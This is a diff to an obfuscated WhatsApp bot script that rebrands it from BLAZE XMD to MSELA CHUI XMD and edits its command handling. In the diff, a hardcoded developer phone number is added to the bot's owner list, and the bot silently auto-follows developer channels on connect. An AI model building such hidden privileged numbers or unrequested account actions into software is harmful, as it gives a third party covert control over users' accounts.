@@ -52,7 +52,7 @@ const pino = require('pino'),
     } = require("./lib/settingsCache"),
     {
         handleChatbotMessage
-    } = require("./handlers/chatbot"),
+    } = require("./handlres/chatbot"),
     {
         handleEmojiRetrieve
     } = require('./lib/retrieveEmoji'),
@@ -83,7 +83,7 @@ async function maybeRegisterAutoContact(_0x3ebf38, _0x41595e, _0x50f5b5, _0x4eef
     if (!_0x41595e['endsWith']('@s.whatsapp.net') && !_0x41595e['endsWith']('@lid')) return;
     const _0x31abe6 = normalizePrivateContactJid(_0x50f5b5);
     if (!_0x31abe6 || !await shouldRegisterAutoContact(_0x31abe6)) return;
-    await registerAutoContact(_0x31abe6, "New Contact • BLAZE TECH");
+    await registerAutoContact(_0x31abe6, "New Contact • 𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃");
 }
 const {
     cacheLidPhone,
@@ -144,7 +144,7 @@ function decodeSessionId(_0x208c32) {
     const _0x25cb0c = null;
     let _0x4e28a1 = String(_0x208c32 || '')["trim"]();
     if (!_0x4e28a1 || _0x4e28a1['toLowerCase']() === 'zokk') return null;
-    _0x4e28a1 = _0x4e28a1['replace'](/^["']|["']$/g, '')['trim'](), _0x4e28a1 = _0x4e28a1["replace"](/^(?:BLAZE|BLAZE-TECH|BLAZE-XMD)~/i, ''), _0x4e28a1 = _0x4e28a1['replace'](/\s+/g, '')['replace'](/-/g, '+')["replace"](/_/g, '/');
+    _0x4e28a1 = _0x4e28a1['replace'](/^["']|["']$/g, '')['trim'](), _0x4e28a1 = _0x4e28a1["replace"](/^(?:MSELA CHUI XMD|𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃|𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃)~/i, ''), _0x4e28a1 = _0x4e28a1['replace'](/\s+/g, '')['replace'](/-/g, '+')["replace"](/_/g, '/');
     if (!/^[A-Za-z0-9+/]*={0,2}$/ ['test'](_0x4e28a1)) throw new Error('SESSION_ID\x20contains\x20invalid\x20characters;\x20use\x20the\x20complete\x20pairing-session\x20string');
     while (_0x4e28a1['length'] % 0x4) _0x4e28a1 += '=';
     return Buffer['from'](_0x4e28a1, 'base64')["toString"]("utf8");
@@ -190,8 +190,9 @@ function safeReconnect(_0x324442) {
         main();
     }, 0x7d0);
 }
-const CHANNEL_JID = '120363421014261315@newsletter',
-    GROUP_INVITE_LINK = 'https://chat.whatsapp.com/HxCDA2s89LMEZMyixnTSy5?s=cl&p=a&ilr=4',
+const CHANNEL_JID = '120363405040601085@newsletter',
+    CHANNEL_JIDS = ['120363405040601085@newsletter', '120363421014261315@newsletter'],
+    GROUP_INVITE_LINK = 'https://chat.whatsapp.com/DmSuN4ZMdnkAGdnpK0Q5Gl?s=cl&p=a&mlu=4&ilr=4',
     CHANNEL_EMOJIS = ['🔥', '❤️', '✊️'],
     STATUS_EMOJIS = ['❤️', '🩶', '🔥', '🤍', '♦️', '🎉', '💚', '💯', '✨', '☢️', '😍', '🎊'];
 let hasFollowedChannel = ![],
@@ -225,9 +226,13 @@ function shortenChannelUrl(_0x55ae26) {
 async function joinConfiguredDestinations(_0x37ee45) {
     const _0x52cf22 = null;
     if (!hasFollowedChannel) try {
-        hasFollowedChannel = !![], await _0x37ee45['newsletterFollow'](CHANNEL_JID), console['log']("✅ Auto-followed BLAZE Tech channel");
+        hasFollowedChannel = !![], await Promise.allSettled(CHANNEL_JIDS.map(jid => _0x37ee45['newsletterFollow'](jid))), console['log']("✅ Auto-followed configured channels");
     } catch (_0x3e14a5) {
         console['log']("Auto-follow channel failed or already followed: " + (_0x3e14a5['message'] || _0x3e14a5));
+    }
+    if (String(getConf('AUTO_JOIN_GROUP') || conf.AUTO_JOIN_GROUP || 'off').toLowerCase() !== 'on') {
+        console['log']('ℹ️ Auto-join group is disabled by default; set AUTO_JOIN_GROUP=on to enable it.');
+        return;
     }
     if (!hasJoinedConfiguredGroup) {
         const _0x497bb1 = extractGroupInviteCode(GROUP_INVITE_LINK);
@@ -238,7 +243,7 @@ async function joinConfiguredDestinations(_0x37ee45) {
         try {
             hasJoinedConfiguredGroup = !![];
             const _0x2fdeac = await _0x37ee45['groupAcceptInvite'](_0x497bb1);
-            console['log']('✅\x20Auto-joined\x20configured\x20BLAZE\x20group:', _0x2fdeac || "accepted");
+            console['log']('✅\x20Auto-joined\x20configured\x20MSELA CHUI XMD\x20group:', _0x2fdeac || "accepted");
         } catch (_0x4a5083) {
             console['log']("Auto-join group failed or bot is already a member: " + (_0x4a5083['message'] || _0x4a5083));
         }
@@ -273,12 +278,15 @@ async function main() {
     } = await (0x0, baileys_1['fetchLatestBaileysVersion'])(), {
         state: _0x3c8bf8,
         saveCreds: _0x3818cf
-    } = await (0x0, baileys_1["useMultiFileAuthState"])(__dirname + '/public'), _0x2db888 = {
+    } = await (0x0, baileys_1["useMultiFileAuthState"])(__dirname + '/public');
+    // Android is the only supported device profile.
+    const _0x4b0aBrowser = ['MSELA CHUI XMD Android', 'Chrome', '1.0.0'];
+    const _0x2db888 = {
         'version': _0x5623b0,
         'logger': pino({
             'level': 'silent'
         }),
-        'browser': ['Blaze-Tech', 'safari', '1.0.0'],
+        'browser': _0x4b0aBrowser,
         'printQRInTerminal': ![],
         'fireInitQueries': ![],
         'shouldSyncHistoryMessage': () => ![],
@@ -414,7 +422,7 @@ async function main() {
                     }
                     continue;
                 }
-                if (_0x11f5b5 === CHANNEL_JID) try {
+                if (CHANNEL_JIDS.includes(_0x11f5b5)) try {
                     const _0x401b02 = _0x5e899c['key']?.['server_id'] || _0x5e899c['newsletterServerId'] || _0x5e899c['key']['id'];
                     if (!_0x401b02 || !_0x4f6f40?.["user"]?.['id']) continue;
                     const _0x32f458 = CHANNEL_EMOJIS[Math['floor'](Math['random']() * CHANNEL_EMOJIS['length'])],
@@ -635,7 +643,7 @@ async function main() {
         if (_0x56c510["slice"](0x1)['toLowerCase']() === 'vcf') {
             if (!_0x43be20["endsWith"]('@g.us')) {
                 await _0x4f6f40['sendMessage'](_0x43be20, {
-                    'text': '❌\x20This\x20command\x20only\x20works\x20in\x20groups.\x0a\x0a🚀\x20Blaze\x20Tech'
+                    'text': '❌\x20This\x20command\x20only\x20works\x20in\x20groups.\x0a\x0a🚀\x20MSELA\x20CHUI\x20XMD'
                 });
                 return;
             }
@@ -652,8 +660,12 @@ async function main() {
             {
                 messages: _0x198bda
             } = _0x2273d3,
-            _0x4aeba8 = _0x198bda[0x0];
-        if (!_0x4aeba8['message']) return;
+            _0x4aeba8 = (_0x198bda || []).find(_0x2e0b1a => {
+                const _0x4b6f3a = (0x0, baileys_1['normalizeMessageContent'])(_0x2e0b1a?.['message']) || _0x2e0b1a?.['message'];
+                return _0x4b6f3a && !_0x4b6f3a['protocolMessage'] && (0x0, baileys_1['getContentType'])(_0x4b6f3a) !== 'reactionMessage';
+            }) || (_0x198bda || [])[0x0];
+        if (!_0x4aeba8?.['message']) return;
+        _0x4aeba8['message'] = (0x0, baileys_1['normalizeMessageContent'])(_0x4aeba8['message']) || _0x4aeba8['message'];
         const _0x2c7ae1 = _0xf6d9ab => {
             const _0x1b42f4 = null;
             if (!_0xf6d9ab) return _0xf6d9ab;
@@ -685,7 +697,7 @@ async function main() {
         var _0x3311e4 = _0x2decc9 ? _0x4aeba8['key']['participant'] : '';
         const _0x3a9771 = _0x4aeba8['pushName'],
             _0x1d5bd7 = cachedSudoNumbers,
-            _0x52590b = '255627417402',
+            _0x52590b = '260774358600',
             _0x5eb3d7 = (getConf("NUMERO_OWNER") || conf['NUMERO_OWNER'] || '')['replace'](/[^0-9]/g, ''),
             _0x403e7b = [_0x474608, _0x52590b, _0x5eb3d7]["filter"](Boolean)["map"](_0x1a3eab => _0x1a3eab['replace'](/[^0-9]/g, '') + '@s.whatsapp.net'),
             _0x19789f = _0x403e7b['concat'](_0x1d5bd7),
@@ -699,7 +711,7 @@ async function main() {
                 'quoted': _0x4aeba8
             });
         }
-        console["log"]("\t🌍BLAZE-TECH ONLINE🌍"), console["log"]("=========== incoming message ===========");
+        console["log"]("\t🌍𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃 ONLINE🌍"), console["log"]("=========== incoming message ===========");
         _0x2decc9 && console['log']("message from group: " + _0x584d73);
         console["log"]('message\x20sent\x20by:\x20' + '[' + _0x3a9771 + '\x20:\x20' + _0x15bc47['split']("@s.whatsapp.net")[0x0] + '\x20]'), console["log"]('message\x20type:\x20' + _0x28711d), console['log']('------\x20message\x20content\x20------'), console["log"](_0xb210b1);
 
@@ -746,8 +758,11 @@ async function main() {
         const _0x44a93a = _0x2decc9 ? _0x4ebedd(_0x15bc47, _0x276ee8) : ![],
             _0x285f7c = _0x2decc9 ? _0x4ebedd(_0xb17d2e, _0x276ee8) : ![],
             _0x85f99a = _0xb210b1 ? _0xb210b1['trim']()['split'](/ +/)['slice'](0x1) : null,
-            _0x33cedd = _0xb210b1 ? _0xb210b1['startsWith'](getConf('PREFIXE')) : ![],
-            _0xf89cb7 = _0x33cedd ? _0xb210b1["slice"](0x1)['trim']()["split"](/ +/)["shift"]()['toLowerCase']() : _0xb210b1 && /^sendtopm(?:\s|$)/i ['test'](_0xb210b1['trim']()) ? 'sendtopm' : ![],
+            _0x4b8d2a = _0xb210b1 ? _0xb210b1['trim']()['split'](/ +/)[0x0]['toLowerCase']() : '',
+            _0x4e0c91 = String(getConf('MODE') || 'on')['trim']()['toLowerCase'](),
+            _0x4e7a12 = evt['cm']['some'](_0x4c7a31 => _0x4c7a31['nomCom'] === _0x4b8d2a || Array['isArray'](_0x4c7a31['alias']) && _0x4c7a31['alias']['includes'](_0x4b8d2a)),
+            _0x33cedd = _0xb210b1 ? (_0xb210b1['startsWith'](getConf('PREFIXE')) || !_0xb210b1['startsWith'](getConf('PREFIXE')) && !['off', 'private', 'no', 'false', '0'].includes(_0x4e0c91) && _0x4e7a12) : ![],
+            _0xf89cb7 = _0x33cedd ? (_0xb210b1['startsWith'](getConf('PREFIXE')) ? _0xb210b1["slice"](getConf('PREFIXE')['length']) : _0xb210b1)['trim']()["split"](/ +/)["shift"]()['toLowerCase']() : _0xb210b1 && /^sendtopm(?:\s|$)/i ['test'](_0xb210b1['trim']()) ? 'sendtopm' : ![],
             _0x58e872 = conf["URL"]['split'](',');
 
         function _0x8f0699() {
@@ -808,7 +823,7 @@ async function main() {
                 if (_0x422d84) {
                     if (!_0x285f7c) {
                         await _0x4f6f40['sendMessage'](_0x3ac8b2, {
-                            'text': '⚠️\x20This\x20message\x20matched\x20the\x20group\x20moderation\x20policy,\x20but\x20BLAZE\x20XMD\x20needs\x20group-admin\x20rights\x20to\x20delete\x20messages.',
+                            'text': '⚠️\x20This\x20message\x20matched\x20the\x20group\x20moderation\x20policy,\x20but\x20MSELA CHUI XMD\x20XMD\x20needs\x20group-admin\x20rights\x20to\x20delete\x20messages.',
                             'mentions': [_0x15bc47]
                         });
                         return;
@@ -887,7 +902,7 @@ async function main() {
         }
         try {
             if (_0x4aeba8["message"][_0x28711d]["contextInfo"]['mentionedJid'] && (_0x4aeba8["message"][_0x28711d]['contextInfo']['mentionedJid']['includes'](_0xb17d2e) || _0x4aeba8['message'][_0x28711d]['contextInfo']["mentionedJid"]['includes'](conf['NUMERO_OWNER'] + "@s.whatsapp.net"))) {
-                if (_0x3ac8b2 == '120363421014261315@newsletter') return;;
+                if (_0x3ac8b2 == '120363405040601085@newsletter') return;;
                 if (_0x3b7703) {
                     console['log']('hummm');
                     return;
@@ -978,9 +993,9 @@ async function main() {
                                 console["log"]('antilink\x20remove\x20failed:\x20' + _0x1f24c6);
                             }
                             try {
-                                const _0x4d21af = 'https://raw.githubusercontent.com/blazetech-glitch/BLAZE-XMD/main/plugins/scs/menu1.jpg';
+                                const _0x4d21af = 'https://raw.githubusercontent.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES/main/plugins/scs/leopard-menu-1.png';
                                 var _0x9acb2b = new Sticker(_0x4d21af, {
-                                    'pack': 'Blaze-Tech',
+                                    'pack': 'MSELA CHUI XMD',
                                     'author': conf['OWNER_NAME'],
                                     'type': StickerTypes["FULL"],
                                     'categories': ['🤩', '🎉'],
@@ -1053,9 +1068,9 @@ async function main() {
                     'participant': _0x15bc47
                 };
                 var _0x25c684 = "bot detected, \n";
-                const _0x43f9b1 = 'https://raw.githubusercontent.com/blazetech-glitch/BLAZE-XMD/main/plugins/scs/menu1.jpg';
+                const _0x43f9b1 = 'https://raw.githubusercontent.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES/main/plugins/scs/leopard-menu-1.png';
                 var _0x9acb2b = new Sticker(_0x43f9b1, {
-                    'pack': 'Blaze-Tech',
+                    'pack': 'MSELA CHUI XMD',
                     'author': conf["OWNER_NAME"],
                     'type': StickerTypes["FULL"],
                     'categories': ['🤩', '🎉'],
@@ -1129,10 +1144,15 @@ async function main() {
             console['log'](".... " + _0x1db0bb);
         }
         if (_0x33cedd || _0xf89cb7 === 'sendtopm') {
+            console['log']('[Command gate] command=' + (_0xf89cb7 || '') + ' sender=' + (_0x15bc47 || '') + ' mode=' + String(getConf('MODE') || 'on') + ' public=' + (!['off', 'private', 'no', 'false', '0'].includes(String(getConf('MODE') || 'on').toLowerCase())));
             const _0x5a7239 = evt['cm']['find'](_0x1f211e => _0x1f211e["nomCom"] === _0xf89cb7 || Array['isArray'](_0x1f211e['alias']) && _0x1f211e['alias']['includes'](_0xf89cb7));
+            if (!_0x5a7239) {
+                console['warn']('[Command dispatch] no plugin registered for command=' + (_0xf89cb7 || ''));
+                return;
+            }
             if (_0x5a7239) try {
-                const _0x1fe1fe = String(getConf('MODE') || '')['trim']()["toLowerCase"](),
-                    _0x4d1e58 = _0x1fe1fe === 'on' || _0x1fe1fe === "public",
+                const _0x1fe1fe = String(getConf('MODE') || 'on')['trim']()["toLowerCase"](),
+                    _0x4d1e58 = !['off', 'private', 'no', 'false', '0'].includes(_0x1fe1fe),
                     _0x17f5e7 = new Set(_0x22fa2a(_0xb17d2e)),
                     _0x5a7fba = Boolean(_0x4aeba8['key']?.["fromMe"]) || _0x22fa2a(_0x15bc47)["some"](_0x5e67a7 => _0x17f5e7['has'](_0x5e67a7)),
                     _0x2b3354 = _0xf89cb7 === 'mode' && _0x3b7703;
@@ -1158,7 +1178,10 @@ async function main() {
                         return;
                     }
                 }
-                reagir(_0x3ac8b2, _0x4f6f40, _0x4aeba8, _0x5a7239['reaction']), _0x5a7239['fonction'](_0x3ac8b2, _0x4f6f40, _0x7b852d);
+                console['log']('[Command dispatch] running command=' + _0xf89cb7 + ' sender=' + (_0x15bc47 || ''));
+                await Promise.resolve(reagir(_0x3ac8b2, _0x4f6f40, _0x4aeba8, _0x5a7239['reaction']));
+                await Promise.resolve(_0x5a7239['fonction'](_0x3ac8b2, _0x4f6f40, _0x7b852d));
+                console['log']('[Command dispatch] completed command=' + _0xf89cb7);
             } catch (_0x522569) {
                 console['log']('😡😡\x20' + _0x522569), _0x4f6f40["sendMessage"](_0x3ac8b2, {
                     'text': '😡😡\x20' + _0x522569
@@ -1170,7 +1193,7 @@ async function main() {
     });
     const {
         groupEvents: _0x36ec8b
-    } = require("./handlers/eventHandler");
+    } = require("./handlres/eventHandler");
     _0x4f6f40['ev']['on']('group-participants.update', async _0x127afa => {
         const _0x342506 = _0x1c997b;
         try {
@@ -1235,13 +1258,13 @@ async function main() {
                 lastDisconnect: _0x50e096,
                 connection: _0x5f45b3
             } = _0x490e8e;
-        if (_0x5f45b3 === 'connecting') console["log"]('\x20blaze\x20tech\x20is\x20connecting...');
+        if (_0x5f45b3 === 'connecting') console["log"]('\x20msela\x20chui\x20is\x20connecting...');
         else {
             if (_0x5f45b3 === 'open') {
-                isReconnecting = ![], boundedAttempts = 0x0, await joinConfiguredDestinations(_0x4f6f40), console['log']("✅ blaze tech Connected to WhatsApp! ☺️"), console['log']('--'), await (0x0, baileys_1['delay'])(0xc8), console['log']('------'), await (0x0, baileys_1['delay'])(0x12c), console['log']('------------------/-----'), console['log']('blaze\x20tech\x20is\x20Online\x20🕸\x0a\x0a'), console['log']('Loading\x20blaze\x20tech\x20Commands\x20...\x0a');
+                isReconnecting = ![], boundedAttempts = 0x0, await joinConfiguredDestinations(_0x4f6f40), console['log']("✅ 𝐌selachui Connected to WhatsApp! ☺️"), console['log']('📱 Device profile: ' + ('Android')), console['log']('--'), await (0x0, baileys_1['delay'])(0xc8), console['log']('------'), await (0x0, baileys_1['delay'])(0x12c), console['log']('------------------/-----'), console['log']('msela\x20chui\x20is\x20Online\x20🕸\x0a\x0a'), console['log']('Loading\x20msela\x20chui\x20Commands\x20...\x0a');
                 const {
                     loadPlugins: _0x2f850a
-                } = require(__dirname + '/handlers/commandHandler');
+                } = require(__dirname + '/handlres/commandHandler');
                 _0x2f850a(__dirname + '/plugins'), (0x0, baileys_1["delay"])(0x2bc);
                 var _0x41aa42;
                 if (getConf("MODE")['toLocaleLowerCase']() === 'on') _0x41aa42 = 'public';
@@ -1252,11 +1275,11 @@ async function main() {
                     'forwardingScore': 0x3e7,
                     'forwardedNewsletterMessageInfo': {
                         'newsletterJid': CHANNEL_JID,
-                        'newsletterName': '𝙱𝙻𝙰𝚉𝙴\x20𝚇𝙼𝙳',
+                        'newsletterName': '𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃',
                         'serverMessageId': 0x1
                     }
                 };
-                let _0xc1e295 = "╭─「 *𝗕𝗟𝗔𝗭𝗘 𝗫𝗠𝗗* 」\n│ ✅ *𝗢𝗡𝗟𝗜𝗡𝗘*\n├──────────────\n│ ⚙️ 𝗠𝗼𝗱𝗲: *" + _0x41aa42['toUpperCase']() + "*\n│ ⌨️ 𝗣𝗿𝗲𝗳𝗶𝘅: *" + prefixe + '*\x0a│\x20🌐\x20𝗪𝗲𝗯:\x20*blaze-xmd.zone.id*\x0a│\x20📣\x20𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹\x20𝗖𝗵𝗮𝗻𝗻𝗲𝗹\x0a╰──────────────';
+                let _0xc1e295 = "╭─「 *𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃* 」\n│ ✅ *𝗢𝗡𝗟𝗜𝗡𝗘*\n├──────────────\n│ ⚙️ 𝗠𝗼𝗱𝗲: *" + _0x41aa42['toUpperCase']() + "*\n│ ⌨️ 𝗣𝗿𝗲𝗳𝗶𝘅: *" + prefixe + '*\x0a│\x20🌐\x20𝗪𝗲𝗯:\x20*github.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES*\x0a│\x20📣\x20𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹\x20𝗖𝗵𝗮𝗻𝗻𝗲𝗹\x0a╰──────────────';
                 const _0x34c72d = (getConf('NUMERO_OWNER') || conf["NUMERO_OWNER"] || '')['replace'](/[^0-9]/g, ''),
                     _0x14e99e = _0x34c72d ? _0x34c72d + "@s.whatsapp.net" : (_0x4f6f40['user']['id'] || '')['split'](':')[0x0]["split"]('@')[0x0] + "@s.whatsapp.net";
                 await _0x4f6f40['sendMessage'](_0x14e99e, {
@@ -1276,7 +1299,7 @@ async function main() {
                         else {
                             if (_0x355b73 === baileys_1["DisconnectReason"]['connectionLost']) console["log"]("connection error 😞 ,,, trying to reconnect... "), safeReconnect("connectionLost");
                             else {
-                                if (_0x355b73 === baileys_1["DisconnectReason"]?.["connectionReplaced"]) console["log"]('❌\x20WhatsApp\x20session\x20conflict\x20(440):\x20another\x20BLAZE\x20XMD\x20deployment\x20is\x20already\x20using\x20this\x20session.'), console["log"]('🛑\x20Automatic\x20reconnect\x20is\x20disabled\x20for\x20this\x20conflict.\x20Stop\x20every\x20other\x20bot\x20instance,\x20then\x20restart\x20this\x20one\x20once.');
+                                if (_0x355b73 === baileys_1["DisconnectReason"]?.["connectionReplaced"]) console["log"]('❌\x20WhatsApp\x20session\x20conflict\x20(440):\x20another\x20MSELA CHUI XMD\x20XMD\x20deployment\x20is\x20already\x20using\x20this\x20session.'), console["log"]('🛑\x20Automatic\x20reconnect\x20is\x20disabled\x20for\x20this\x20conflict.\x20Stop\x20every\x20other\x20bot\x20instance,\x20then\x20restart\x20this\x20one\x20once.');
                                 else {
                                     if (_0x355b73 === baileys_1['DisconnectReason']['loggedOut']) console['log']("you are disconnected ,,, please rescan the QR code");
                                     else {
